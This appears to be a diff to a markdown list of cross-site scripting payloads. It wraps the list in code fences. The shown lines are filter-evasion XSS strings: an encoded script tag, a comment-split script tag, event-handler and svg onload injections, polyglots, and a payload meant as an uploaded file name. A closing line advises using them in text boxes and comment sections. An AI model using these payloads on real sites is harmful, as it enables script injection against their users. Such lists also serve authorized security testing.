@@ -1,3 +1,4 @@
+```
 &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
 <scr<!--comment-->ipt>alert('XSS')</scr<!--comment-->ipt>
 <input onfocus="alert('XSS')">
@@ -17,7 +18,7 @@ ${alert(1)}
 `-alert(1)">'onload="`<svg/1='
 */</script>'>alert(1)/*<script/1='
 "><svg onload=alert(1)>.gif //On file upload try this as name
-
+```
 
 Use this where text boxes, comment sections, etc that alows some markup input.
 
